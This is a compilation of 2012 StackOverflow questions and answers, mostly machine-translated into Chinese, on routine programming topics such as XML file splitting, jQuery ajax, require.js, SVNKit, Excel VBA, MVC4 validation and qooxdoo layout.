# StackOverflow 问答 12866000-12866999

# xml - Unix - 将包含 XML 文件的文件拆分为单个文件

> ID：12866007
> 
> 赞同：3
> 
> 时间：2012-10-12T19:43:33.387
> 
> 标签：xml, file, unix, grep

我一直在研究一段代码，它将包含多个 XML 文件的文件拆分为单独的 XML 文件。每个 XML 文件的行数各不相同，因此我一直使用 XML 头标记来了解下一个文件的开始位置。

```
grep -n $string $xmlfile | sed -n 's/^\([0-9]*\)[:].*/\1p' 
```

这让我得到了每个文件开头的行号。如何使用 head/tail 命令利用行号在单个自动化脚本中将文件分开？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T19:50:08.200

```
// x1, x2 being XML declaration line numbers
cat myfile | head -n x2 | tail -n x1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T19:47:29.080

在您喜欢的文件中解析`xml`文件时`shell`，最好的办法是使用`xmllint`命令行和`Xpath`表达式。

* * *

`xmllint`来自`libxml`.

请参阅[http://www.xmlsoft.org/](http://www.xmlsoft.org/)和[http://en.wikipedia.org/wiki/Xpath](http://en.wikipedia.org/wiki/Xpath)

# xml - 博客文章标签和类别的 HTML5 语义标记

> ID：12866008
> 
> 赞同：9
> 
> 时间：2012-10-12T19:43:34.917
> 
> 标签：xml, html, metadata, schema.org

许多博客使用“标签”和“类别”的概念将元数据添加到帖子中。对此信息进行语义标记的最佳实践是什么，以便阅读博客文章的机器可以轻松识别标签？

目前我添加`"tag"`到`rel`链接上的属性，例如

```
<a rel="tag" class="tag" href="/tags.html#site-configuration">#site-configuration</a> 
```

我想可以使用 Dublin Core 的 html 格式作为关键字：

```
<meta name = "DC.Subject"
          content = "site-configuration"> 
```

并将其添加到页眉中，或者元标记可以放在正文中吗？一个或另一个更可取，还是一些完全不同的选择？

在为内容提供精确和标准化的定义方面是否有更好的策略？

如果我想对元数据如此挑剔，或者我应该使用 XML 文档类型，HTML5 是一个合理的选择吗？

不同方法的优缺点是什么？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-13T01:30:11.303

**第一步**是在语义上正确获取/使用纯 HTML。`section`在 (X)HTML5 的情况下，您应该使用分段内容元素、`article`、`aside`和构建适当的大纲`nav`，并使用`header`和`footer`将元数据内容与主要内容分开；还可以考虑内联级别的语义，例如`time`（发布日期）、`dfn`（定义）、`abbr`（缩写/首字母缩略词）等。并使用规范中定义的`meta`-`name`和值。`rel`

**第二步**是使用规范中未定义但在指定位置注册的元数据属性值（因此它们可以有效使用），例如元素[的](https://stackoverflow.com/a/16207631/1591669)[`name`关键字`meta`](https://stackoverflow.com/a/16207631/1591669)和[//](https://stackoverflow.com/a/19428907/1591669)[元素](https://stackoverflow.com/a/19428907/1591669)的[`rel`值。`a``area``link`](https://stackoverflow.com/a/19428907/1591669)

第三**步**是使用语义、机器可读的注释来增强标记。有[三种常见的方法可以做到这一点](https://stackoverflow.com/a/27175699/1591669)：

*   微格式（使用预定义`class`和`rel`值）
*   RDFa（使用属性和 URI）
*   微数据（使用属性和 URI）

RDFa 和 Microdata 是相似的（可扩展且相当复杂），而 Microformats 更简单（但不是那么富有表现力/可扩展性）。我在 Programmers 上写了一个关于差异的[简短答案，以及关于](https://softwareengineering.stackexchange.com/a/166669/63183)[Microdata 和 RDFa 之间差异](https://stackoverflow.com/a/25888436/1591669)的更详细的答案。

对于 RDFa 或微数据，您的主要工作是找到能够描述/分类您的内容的词汇表/本体。每个人都可以创建这样的词汇表（您甚至可以自己创建一个），但通常建议使用众所周知/流行的词汇表，例如，以便搜索引擎可以使用您的注释（流行的例子：[Schema.org](http://schema.org/)）。

对于微格式，您必须找到适合您需要的微格式（在[wiki at microformats.org上）。](http://microformats.org/wiki/)如果您的情况没有，您可以提出一个新的微格式（但如果有的话，这将需要一些时间才能被“接受”）。

* * *

> 如果我想对元数据如此挑剔，或者我应该使用 XML 文档类型，HTML5 是一个合理的选择吗？

如果您需要/想要 XML 支持，您也可以使用 XHTML5。如果您“仅”使用规范中定义的 (X)HTML 而没有额外的 XML 模式/词汇表，那么从语义的角度来看，您使用 HTML(5) 还是 XHTML(5) 并不重要。

# ios - UIActivity 和 AVAsset 数据类型使用

> ID：12866012
> 
> 赞同：1
> 
> 时间：2012-10-12T19:44:00.580
> 
> 标签：ios, facebook, uiactivity, avasset

根据[UIActivity 类文档](http://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIActivity_Class/Reference/Reference.html)，可以将`AVAsset`对象作为数据源添加到`UIActivityTypePostToFacebook`活动中。这是否意味着我们可以使用标准活动类型**发布视频？**如果不是，那么我可以使用活动项目`UIActivityTypePostToFacebook`发布什么样的项目？`AVAsset`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T21:44:31.210

嗯..根据*UIActivity.h*

```
UIKIT_EXTERN NSString *const UIActivityTypePostToFacebook   NS_AVAILABLE_IOS(6_0); // text, images, URLs
UIKIT_EXTERN NSString *const UIActivityTypePostToTwitter    NS_AVAILABLE_IOS(6_0); // text, images, URLs
UIKIT_EXTERN NSString *const UIActivityTypePostToWeibo      NS_AVAILABLE_IOS(6_0); // text, images, URLs
UIKIT_EXTERN NSString *const UIActivityTypeMessage          NS_AVAILABLE_IOS(6_0); // text
UIKIT_EXTERN NSString *const UIActivityTypeMail             NS_AVAILABLE_IOS(6_0); // text, image, file:// URLs
UIKIT_EXTERN NSString *const UIActivityTypePrint            NS_AVAILABLE_IOS(6_0); // image, NSData, file:// URL, UIPrintPageRenderer, UIPrintFormatter, UIPrintInfo
UIKIT_EXTERN NSString *const UIActivityTypeCopyToPasteboard NS_AVAILABLE_IOS(6_0); // text, image, NSURL, UIColor, NSDictionary
UIKIT_EXTERN NSString *const UIActivityTypeAssignToContact  NS_AVAILABLE_IOS(6_0); // image
UIKIT_EXTERN NSString *const UIActivityTypeSaveToCameraRoll NS_AVAILABLE_IOS(6_0); // image, video 
```

视频仅在评论中提及`UIActivityTypeSaveToCameraRoll`。这意味着可以使用这些标准活动类型将唯一的图像添加为 AVAsset 实例。

# javascript - 在异步 ajax 请求之前运行一个函数

> ID：12866013
> 
> 赞同：1
> 
> 时间：2012-10-12T19:44:03.280
> 
> 标签：javascript, jquery, ajax, asynchronous

我正在尝试在异步 ajax 请求之前运行一个函数。但是，异步请求得到响应后，函数正在运行。

有没有办法解决这个问题？

```
block();

ajaxRequest= $.ajax({
    url: siteURL+'includes/ajax/action.php',
    type: "POST",
    async: false,
    data: {productID : productID},
    dataType: "json"
});
ajaxRequest.done(function(data) {
            block(true);
            if (data === false) {
                alerts('error title','error info here', 'error', 200);
                return false;
            }
});
ajaxRequest.fail(function(jqXHR, textStatus) {block(true); alerts('error title','error info','error');});
confirm(); 
```

我在这些代码之后运行更多功能。然而，正如我之前所说，`block();`函数正在等待异步 ajax 请求得到响应。

如果我不异步运行，那么我会得到`block()`和`confirm()`函数同时运行，因此`return false;`失去了所有意义。

PS 我在提交表单时运行这些代码，所以如果异步请求失败，我不希望它在它之后运行任何其他代码。但是，当它异步运行时`block()`正在等待返回响应。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T19:49:20.280

你的问题是`async:false`。您的请求不是异步请求，而是同步请求。它会在处理请求时阻止 javascript 代码和浏览器呈现。`async: false,`使用您当前的设置，删除因此使其异步应该没有害处。

```
block();

ajaxRequest= $.ajax({
    url: siteURL+'includes/ajax/action.php',
    type: "POST",
    data: {productID : productID},
    dataType: "json"
});
ajaxRequest.done(function(data) {
            block(true);
            if (data === false) {
                alerts('error title','error info here', 'error', 200);
                return false;
            }
});
ajaxRequest.fail(function(jqXHR, textStatus) {block(true); alerts('error title','error info','error');});
ajaxRequest.always(confirm); 
```

# asp.net - How to create a reusable rdlc template?

> ID：12866015
> 
> 赞同：0
> 
> 时间：2012-10-12T19:44:07.913
> 
> 标签：asp.net, vb.net, rdlc

How to create an rdlc template so that we can use it for all the rdlc files in a project reducing the time to format each and every rdlc file. is it possible to create a rdlc template by which we can have the header to all rdlc files as same as rdlc template by inheriting it??

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:02:31.340

SQL 2008 R2 的 SSRS 添加了一些用于使用可重用查询（数据集）和报告标头的功能。该技术的两个注意事项是 1) 您只能通过 SSRS 2008 R2 呈现这些报告（不能通过 Winforms 或 Webforms 的 .net 报告控件），以及 2) 您需要通过 Report Builder 3.0 编辑它们（这需要提升SSRS 的权限）。它不适用于 BIDS (VS2008)。我听说您可以通过获取 VStudio 2010 的附加组件或使用 VStudio 2012 来编辑新的 RDLC，但我无法确认这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-25T15:16:59.423

这通常通过页眉和页脚的子报表来完成。

[是否可以在 Visual Studio 2010 的 ReportViewer 中重用页眉或页脚？](https://stackoverflow.com/questions/8577186/is-it-possible-to-reuse-a-header-or-footer-in-reportviewer-in-visual-studio-2010)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T21:12:45.920

我通常使用一个很好的比较工具，比如 Beyond Compare，并将模板中的所有内容合并到新报告中。

这不是那么花哨但有效。此外，您还可以很好地了解报告的定义方式。

# javascript - Require.js - Shared r.js config not using correct 'paths' values

> ID：12866016
> 
> 赞同：3
> 
> 时间：2012-10-12T19:44:08.983
> 
> 标签：javascript, requirejs

I am using a '`mainConfigFile`' between my development require.js environment and the r.js build tools—much like the setup in the [Require.js multipage example](https://github.com/requirejs/example-multipage). The modules require and load fine in development, but when I try to run the same config file through r.js it searches for module paths that are one directory higher. (For example. it searches for the build version of backbone.js in build/backbone.js when it should be looking in build/vendor/backbone.js).

Here is my r.js build json config:

```
{
    baseUrl: "js/lib",
    mainConfigFile: 'js/lib/common.js',
    dir: 'build',
    paths: {
        'stripe': 'empty:'
    },
    modules: [
        {
            name: "common",
            include: [
                'underscore',
                'backbone',
                'backbone.validation',
                'vendor/spin',
                'vendor/transit',
                'globals'
            ]
        },
        {
            name: 'product',
            exclude: [ 'common' ]
        }
    ],
    optimize: 'none'
} 
```

Here is my common.js shared config file located in js/lib/common.js

```
requirejs.config({
    baseUrl: '/js/lib',
    paths: {
        'config':       'empty:',
        'inline':       'empty:',
        'stripe':       '//js.stripe.com/v1/stripe',
        'vendor':       '../vendor',
        'underscore':       '../vendor/underscore',
        'backbone':     '../vendor/backbone',
        'backbone.validation':  '../vendor/backbone.validation',
        'text':         '../vendor/text'
    }
}); 
```

Finally, here is the product.js module located in js/lib/product.js which is loaded from data-main during development.

```
require(['./common'], function() {
    require(['./product/main', 'inline']);
}); 
```

The interesting problem is when I remove "`../vendor/`" from each of the config values—except the 'vendor' property itself—the r.js build is successful and the development data-main is unable to load the correct files. Surely I'm overlooking some config setting.

# php - Javascript simulate pressing enter in input box

> ID：12866017
> 
> 赞同：2
> 
> 时间：2012-10-12T19:44:17.553
> 
> 标签：php, javascript, ajax, enter

I have what seemed to be a simple fix to a problem but after trying a ton of different solutions online nothing seems to work for me.

I have search field that searches a data table every time you type or press enter in the input field, however after I assigned a value to the search box when the page is loaded it wont do the search until after the user either presses enter in the box or types / deletes a letter. I was just trying to find a solution to simulate hitting enter but it didn't seem to work.

Here is my code:

```
<script type="text/javascript">
       window.onload = (function() {
           document.getElementById('search').value = " <?php echo $search;?>";

       });
</script> 
```

This obviously assigns the value to what my php variable is set to which works fine the text is loaded in the box on page load, it just doesnt perform the search like I said unless the user presses enter in the box OR deletes/adds a letter in the input box.

The search box code is

```
<input type="text" id="search" aria-controls="DataTables_Table_0" class="text"> 
```

Update: This is documentation I found on exactly what I am using [http://datatables.net/ref](http://datatables.net/ref)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T19:46:57.913

尝试这个

```
document.getElementById("formId").submit(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T19:47:55.283

您可以在 javascript 中调用该`onchange()`事件：

```
<script type="text/javascript">
   window.onload = (function() {
       document.getElementById('search').value = " <?php echo $search;?>";
       document.getElementById('search').onchange();
   });
</script> 
```

这个答案也有另一种选择：[https ://stackoverflow.com/a/3629423/890726](https://stackoverflow.com/a/3629423/890726)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T19:56:42.643

```
 <input type="text" id="fname" onblur="businessFun()"> 
```

Please try this and in js buinessFun() do the search actions if you use ajax pass current time as parameter

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T19:48:39.313

我假设您有一个表单，在文本框中输入将触发表单的提交。在javascript中，您可以像这样手动执行此操作：

```
<form id='myform" action="/foo">

document.forms["myform"].submit(); 
```

# objective-c - UILabel not moving when its supview is moving

> ID：12866018
> 
> 赞同：0
> 
> 时间：2012-10-12T19:44:17.990
> 
> 标签：objective-c, ios

I have a custom UIImageView where i am placing a UILabel in the init method:

```
-(id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self)
    {
        self.displayNameLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, (self.frame.size.width - 14), (self.frame.size.height - 14))];
        self.displayNameLabel.center = CGPointMake((self.frame.size.width / 2), (self.frame.size.height / 2));
        self.displayNameLabel.backgroundColor = [UIColor clearColor];
        self.displayNameLabel.textAlignment = UITextAlignmentCenter;
        self.displayNameLabel.font = [UIFont fontWithName:labelFont size:22];
        [self addSubview:self.displayNameLabel];

        // Other code
    }
} 
```

this is placed in another UIImageView which is in a UIScrollView.

so, UIScrollView which contains UIImageView which contains custom UIImageView which contains UILabel

when i zoom in on the UIScrollView, my label gets all goofy.

how it looks with no zoom:

![enter image description here](../Images/dff7c5a1727781efd7e60e4279f8bae6.png)

after zooming in:

![enter image description here](../Images/ce11154dfda8912a7d669424e41386ca.png)

I do resize the custom UIImageView when i zoom in so it keeps a constant size (doesn't get larger as you zoom in):

```
-(void)scrollViewDidZoom:(UIScrollView *)scrollView
{
    for (PointImageView *point in self.mapImageView.subviews)
    {
        if ([point isKindOfClass:[PointImageView class]])
        {
            CGPoint oldCenter = point.center;

            float pointSize = point.frame.size.width;

            float newPointSize = pointSize / zoomScale;

            point.frame = CGRectMake(point.frame.origin.x, point.frame.origin.y, newPointSize, newPointSize);

            point.center = oldCenter;
        }
    }

    oldZoomScale = scrollView.zoomScale;
} 
```

when i move my custom UIImageView, why doesn't the label move with it?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T21:01:29.373

好吧，你不是在移动，而是在缩放，所以这是不同的。您还需要调整 uilabel 框架并将 uilabel 行数设置为 1 并将 adjustsfontsizetofitwidth 设置为 yes。还将 minimumFontSize 设置为 5 或 6 像素。

# java - 如何在两个日期之间获取 SVNKit 日志？

> ID：12866019
> 
> 赞同：2
> 
> 时间：2012-10-12T19:44:24.750
> 
> 标签：java, svnkit

我正在使用 SVNKit 1.7，我想获取两个日期之间条目的历史日志。我发现的所有文档只显示了检索两个修订号之间的条目。

我基本上想运行以下命令

```
svn log -v --xml --non-interactive --no-auth-cache http://foo.com  --username myusername --password mypassword -r {""2012-10-02""}:{""2012-11-01""} 
```

现在我正在通过命令行在 Java 中使用 Runtime 类调用它。

我使用此信息的目的是按 SVN 活动的月份生成指标。

如果我必须使用修订号，有没有办法根据日期找到最近的修订号？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-23T14:35:40.647

谢谢 Dmitry，您的回答很有帮助，但我最终使用了 org.tmatesoft.svn.core.io.SVNRepository 类和该类的[getDatedRevision()](https://svnkit.com/javadoc/org/tmatesoft/svn/core/io/SVNRepository.html#getDatedRevision(java.util.Date))方法。在查看文档时，我多次浏览了此方法。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-12T20:47:14.153

```
 final SvnOperationFactory svnOperationFactory = new SvnOperationFactory();
    try {
        final SVNURL url = ...;

        svnOperationFactory.setAuthenticationManager(new BasicAuthenticationManager("myusername", "mypassword"));

        final SvnLog log = svnOperationFactory.createLog();
        log.addRange(SvnRevisionRange.create(SVNRevision.create(date1), SVNRevision.create(date2)));
        log.setDiscoverChangedPaths(true);
        log.setSingleTarget(SvnTarget.fromURL(url));
        log.setReceiver(new ISvnObjectReceiver<SVNLogEntry>() {
            @Override
            public void receive(SvnTarget target, SVNLogEntry logEntry) throws SVNException {
                ...
            }
        });
        log.run();
    } finally {
        svnOperationFactory.dispose();
    } 
```

# android - 可以在 AlertDialog 中使用 Android 的 OnLongClickListener 吗？

> ID：12866022
> 
> 赞同：0
> 
> 时间：2012-10-12T19:44:29.833
> 
> 标签：android, android-alertdialog, onlongclicklistener

我有一个显示在 AlertDialog 中的选项列表。AlertDialog 从 SharedPreferences 文件填充列表。当前用户进行选择，AlertDialog 关闭，并根据选择填写一些编辑文本字段。

我想为列表中的每个选项添加一个 OnLongClickListener 调用，使用时会在现有选项的顶部弹出另一个 AlertDialog，并带有一个简单的“你确定要删除它吗？” 问题，然后是“是”和“否”按钮。

对话框创建很简单，我只想知道 OnLongClickListener 是否可以应用，AlertDialogs 是否可以相互叠加？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-04T19:11:55.973

[我在这里](https://stackoverflow.com/questions/9145628/add-onlongclick-listener-to-an-alertdialog/14163293#14163293 "这里")的回答可能有助于添加`OnLongClickListener`. 我添加的代码在我的回复的底部。

您可以通过`OnShowListener`在对话框上设置一个新的并覆盖该`onShow()`方法来完成您想要的

# excel - 基于另一个选择列表动态更新选择列表

> ID：12866023
> 
> 赞同：0
> 
> 时间：2012-10-12T19:44:31.747
> 
> 标签：excel, vba

我想根据另一个用户的选择填写一个下拉列表。在网上找不到与它相关的任何东西。

我有一个名为**lookupDept**的工作簿，其中包含下表：

```
A   B
==  ==============================
BS  Business School
CG  Chemical Engineering 
```

其中*列 A*具有定义的名称**deptCode**，*列 B*具有定义的名称**deptName**。我有第二个名为**lookupModule**的工作簿，其中包含下表：

```
A       B                                                   C
======  ==================================================  ==
BSA005  Organisational Behaviour                            BS
BSA007  Skills for Study                                    BS
CGA001  Fluid Mechanics I MEng & BEng Status                CG
CGA002  Stagewise Processes                                 CG 
```

我正在尝试更新表单上的**cbo_moduleCode**以选择一个范围，其中**lookupDept中***的 A 列*与**lookupModule中的***C*列匹配。这是我正在使用的代码：

 **因此，如果用户在表单上选择*BS - Business School*（从**lookupDept**工作簿中提取，我希望选中**lookupModule**工作簿的 C 列中包含*BS*的所有字段。这是我目前使用的代码：

 **```
Private Sub UserForm_Initialize()

    Dim c_deptCode As Range
    Dim c_deptName As Range

    Dim deptCodes As Variant
    Dim deptNames As Variant

    Dim ws_dept As Worksheet
    Dim ws_misc As Worksheet
    Set ws_dept = Worksheets("lookupDept")
    Set ws_misc = Worksheets("lookupMisc")

    ' Assign each range to an array containing the values
    deptCodes = Choose(1, ws_dept.Range("deptCode"))
    deptNames = Choose(1, ws_dept.Range("deptName"))

    ' Create deptcode+deptname cbo
    For i = 1 To ws_dept.Range("deptCode").Rows.Count
        CombinedName = deptCodes(i, 1) & " - " & deptNames(i, 1)
        cbo_deptCode.AddItem CombinedName
    Next i

End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T19:59:51.853

选择第一个组合框后，您可以尝试即时添加项目。此代码是一个示例，可能会引导您朝着正确的方向前进：

```
Private Sub cbo_deptCode_Change()
Dim lLoop As Long, rgLoop As range

For lLoop = 1 To Me.cbo_moduleCode.ListCount

    Me.cbo_moduleCode.RemoveItem 0

Next lLoop

Sheets("lookupModule").[a1].CurrentRegion.AutoFilter
Sheets("lookupModule").[a1].CurrentRegion.AutoFilter Field:=3, Criteria1:=Left(Me.cbo_deptCode.Value, 2)

For Each rgLoop In Sheets("lookupModule").[a1].CurrentRegion.Offset(1).SpecialCells(xlCellTypeVisible).Columns(1).Cells
    If Len(rgLoop) > 0 Then
        Me.cbo_moduleCode.AddItem rgLoop & " - " & rgLoop.Offset(, 1)
    End If
Next rgLoop

End Sub 
```****

# javascript - JavaScript 正则表达式奇怪的行为

> ID：12866024
> 
> 赞同：2
> 
> 时间：2012-10-12T19:44:34.777
> 
> 标签：javascript, regex

我已经简化了我遇到的问题。
如果我在 Chrome 中执行以下代码，我会得到一个奇怪的行为：

```
var a = "$&";
var b = "aba";

var c = b.replace(/a/, a);

console.log(c); // expected output is: "$&b$&"
                // but output is:      "aba" 
```

但是如果我执行以下代码，我会得到预期的输出

```
var a = "c";
var b = "aba";

var c = b.replace(/a/, a);

console.log(c); // expected output is: "cbc"
                // and output is:      "cbc" 
```

任何想法如何解决这个问题？
这是一个错误吗？
我是否必须以某种方式转义变量 a 中的字符串？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T19:52:23.523

如果要`$`在替换字符串中使用，则需要使用`$$`. [该`$`字符用作反向引用](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/replace#Specifying_a_string_as_a_parameter)：

```
var a,
    b,
    c;
a = "$$&";
b = "aba";
c = b.replace(/a/, a);
console.log(c); //$&ba 
```

如果要替换字符串中模式的所有实例，则需要[将正则表达式标记为 global](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/RegExp)：

```
var a,
    b,
    c;
a = "$$&";
b = "aba";
c = b.replace(/a/g, a);
console.log(c); //$&b$& 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T19:47:13.273

是`$`一个反向引用字符。它在替换字符串中具有特殊含义。

请参阅此相关问题：
[JavaScript - 字符串正则表达式反向引用](https://stackoverflow.com/questions/2447915/javascript-string-regex-backreferences)

或者，更有帮助的是，访问此页面以获取更详细的文档：
[http ://www.regular-expressions.info/javascript.html#replace](http://www.regular-expressions.info/javascript.html#replace)

要修复您的替换，请尝试：

```
var a = "$$&";
var b = "aba";

var c = b.replace(/a/g, a); 
```

**编辑：**忘记了全局替换字符。添加。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:04:06.260

两个问题：

（1）如果要替换所有出现，则需要使用`/g`修饰符

(2) 正则表达式中的字符串`$&`具有模式匹配的含义，因此您自己替换了匹配

把它放在一起你需要修改你的代码，将美元符号转义为另一个...... >>

```
var a = "$$&"; 
var b = "aba"; 
var c = b.replace(/a/g, a); 
```

# c# - 无法打开 https://graph.facebook.com/

> ID：12866028
> 
> 赞同：0
> 
> 时间：2012-10-12T19:44:48.220
> 
> 标签：c#, facebook, windows-phone-7, ssl, https

无论我尝试过什么，我都无法从网络浏览器或网络客户端导航到“ *https://graph.facebook.com/... ”。*

每次我尝试调试时，都会收到与目标域证书相关的错误！

我什至尝试过：

[http://dotnetslackers.com/articles/net/wFace-windows-phone-7-facebook-integration-part-1.aspx](http://dotnetslackers.com/articles/net/wFace-windows-phone-7-facebook-integration-part-1.aspx)

它不再适用于我的 VS2010 调试器。

但是之前确实在模拟器和 WP7 设备上工作了几周。

同时，像“ *http://graph.facebook.com/...* ”这样的 url 可以正常工作。

有人遇到过类似的问题吗？

或者有好主意的人来解决这个特殊问题？！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T08:50:40.957

1.  检查[支持的 SSL 证书列表](http://msdn.microsoft.com/en-us/library/windowsphone/develop/gg521150%28v=vs.92%29.aspx)。
2.  如何将SSL 证书[安装到 WP7 模拟器](http://joymonscode.blogspot.com/2011/11/installing-ssl-certificates-to-windows.html)

# asp.net-mvc - MVC4：ModelState.IsValid 总是返回 true

> ID：12866030
> 
> 赞同：2
> 
> 时间：2012-10-12T19:44:51.797
> 
> 标签：asp.net-mvc, validation, asp.net-mvc-4, model-validation

我有一个 PartialView，其中包含一个将数据异步发布到我的控制器的表单。如果有效，控制器将添加用户`ModelState`，如果无效，它将返回带有无效模型的 PartialView。我遇到的问题是`ModelState`无论如何总是有效的。我可以看到表单正在被正确序列化，并且所有属性`DynamicActionUserModel.RegisterModel`都被填充。

我不明白为什么会这样，但是模型绑定是否可能因为模型中有模型而不起作用？

这是我的代码...

**看法**

```
@model IEnumerable<RobotDog.Models.UserModel>
<!-- other stuff -->
<div class="createUser">
    @Html.Partial("_UserPartial", new DynamicActionUserModel { Action = "CreateUser", RegisterModel = new RegisterModel() })    
</div>
<script type="text/javascript">
$(function () {
    $('form.ajax').submit(function () {
        if ($(this).valid()) {
            $.ajax({
                url: this.action,
                type: this.method,
                data: $(this).serialize(),
                success: function (result) {
                    if (result.success) {
                        location.reload(true);
                    } else {
                        $('.createUser').html(result);                          
                    }
                }
            });
        }
        return false;
    });
});
</script> 
```

**_User部分视图**

```
@model RobotDog.Models.DynamicActionUserModel

@using(Html.BeginForm(Model.Action,"Admin", FormMethod.Post, new { @class = "ajax" })) {
    @Html.ValidationSummary(true, "Registration unsuccessful. Please correct errors and try again.")

    @Html.TextBoxFor(x => x.RegisterModel.Email, new { @class = "input-xlarge", @placeholder = "Email"})
    @Html.TextBoxFor(x => x.RegisterModel.UserName, new { @class = "input-xlarge", @placeholder = "User Name"})
    @Html.PasswordFor(x => x.RegisterModel.Password, new { @class = "input-xlarge", @placeholder = "Password"})
    @Html.ListBoxFor(x => x.RegisterModel.SelectedRoles, Model.RegisterModel.Roles)
    <input type="submit" value="Submit" class="btn"/>
}
@section Scripts {
    @Scripts.Render("~/bundles/jqueryval")
} 
```

**动态动作用户模型**

```
public class DynamicActionUserModel {
    public string Action { get; set; }
    public RegisterModel RegisterModel { get; set; }
}

public class RegisterModel {
    [Required(AllowEmptyStrings = false)]
    [Display(Name = "User name")]
    public string UserName { get; set; }

    [Required]
    [DataType(DataType.EmailAddress)]
    [Display(Name = "Email address")]
    public string Email { get; set; }

    [Required]
    [StringLength(100, ErrorMessage = "The {0} must be at least {2} characters long.", MinimumLength = 6)]
    [DataType(DataType.Password)]
    [Display(Name = "Password")]
    public string Password { get; set; }

    public string[] SelectedRoles { get; set; }
    public MultiSelectList Roles { 
        get { return new MultiSelectList(System.Web.Security.Roles.GetAllRoles()); }
    }
} 
```

**控制器**

```
[HttpPost]
public ActionResult CreateUser(DynamicActionUserModel model) {
    if (!ModelState.IsValid) {
        foreach(var value in ModelState.Values) {
            foreach (var error in value.Errors) {
                ModelState.AddModelError(string.Empty, error.ErrorMessage);
            }
        }
        return PartialView("_UserPartial", model);
    }

    try { 
        ...
        return Json(new { success = true });
    }
    catch(Exception e) { ... }

    return PartialView("_UserPartial", model);
} 
```

# excel - Excel 数据透视表：仅基于组的第一行的计算字段

> ID：12866037
> 
> 赞同：0
> 
> 时间：2012-10-12T19:45:19.940
> 
> 标签：excel, excel-2007, excel-2010, pivot-table, calculated-field

我有以下数据和数据透视表：

![在此处输入图像描述](../Images/b8f45f4c364eb86245b2fb51077792bb.png)

数据透视表中的**Total**列是以下计算字段的总和：

```
=start-TIME(7, 30, 0) 
```

我知道这种计算对于我想要实现的目标是错误的。我需要知道我每天有多少延迟才能开始工作。例如，在 12 年 10 月 1 日，假设我应该在 7:30、8:00 - 7:30 开始工作，这会产生 30 分钟的延迟，12 年 10 月 2 日延迟 1 小时，10 月 3 日延迟 50 分钟12\.
所以我的问题是，如何仅基于数据透视表中每个组的第一行来计算字段？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T23:18:02.190

如果可能，我倾向于避免计算字段并在源数据中进行计算。因此，在这种情况下，我会在您的源数据中添加一个延迟列，并计算仅对每个日期的第一行的差异求和：

```
=IF(COUNTIF($A$2:$A2,$A2)=1,B2-TIME(7,30,0),0) 
```

![在此处输入图像描述](../Images/c779fbca7eaffe284dfeeff9b7113649.png)

然后你可以以延迟的总和为中心。格式化延迟数据透视字段，如`[h]:mm`.

![在此处输入图像描述](../Images/7e221fc741531c0c63318daba8693dbd.png)

# qooxdoo - Qooxdoo - 移动地图封面工具栏

> ID：12866038
> 
> 赞同：0
> 
> 时间：2012-10-12T19:45:21.357
> 
> 标签：qooxdoo

您好我在这里使用移动地图演示：http: [//demo.qooxdoo.org/devel/mobileshowcase/index.html#%2Fmaps](http://demo.qooxdoo.org/devel/mobileshowcase/index.html#%2Fmaps)

我试图在地图页面的底部添加一个工具栏。它有效，但随后地图很快将其覆盖。查看 DOM 后，工具栏似乎已添加到地图 div 中。

有没有办法让它出现在地图上方而不是下方？此代码全部包含在 Application.js 文件中。

```
 var maps = test.page.Maps.getInstance();
 var manager = new qx.ui.mobile.page.Manager(false);
  manager.addDetail([
    maps
  ]);
  maps.show();

  var toolbar = this.__toolbar = new qx.ui.mobile.toolbar.ToolBar();
  maps.add(toolbar); 
```

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-13T08:33:53.877

随着`maps.add(toolbar)`您将工具栏添加到地图，这就是它被添加到地图 div 的原因。我想您必须通过 page.Manager 才能将单独的元素添加到 GUI。您可能想要修改实现这一点的[移动教程](http://manual.qooxdoo.org/devel/pages/mobile/tutorial.html)，还包括从 NavigationPage 派生的小部件，就像在地图展示中一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-22T08:41:16.117

看看： [https ://github.com/qooxdoo/qooxdoo/blob/master/application/mobileshowcase/source/class/mobileshowcase/page/Maps.js](https://github.com/qooxdoo/qooxdoo/blob/master/application/mobileshowcase/source/class/mobileshowcase/page/Maps.js)

在这个例子中有几件重要的事情。方法“_createContent”和“_createScrollContainer()”被覆盖。

NavigationPage 默认创建一个 iScroll 容器，您可以将所有小部件放入其中。但是 OpenLayer div 当然不是 qooxdoo 小部件。它有自己的滚动逻辑。这就是为什么，你必须覆盖这些方法。OpenLayer 的大部分样式都无法更改。OpenLayer 覆盖所有内容，因为它具有绝对定位。

但是有一个解决方案：

在 initalize() 方法中使用此方法

```
this.addAfterNavigationBar(widget); 
```

通过将 CSS 类分配给您的小部件

```
 widget.addCssClass("your-class") 
```

更改资源文件夹中的“styles.css”：

```
.your-class {
  z-index: 5000;
  position: absolute;
} 
```

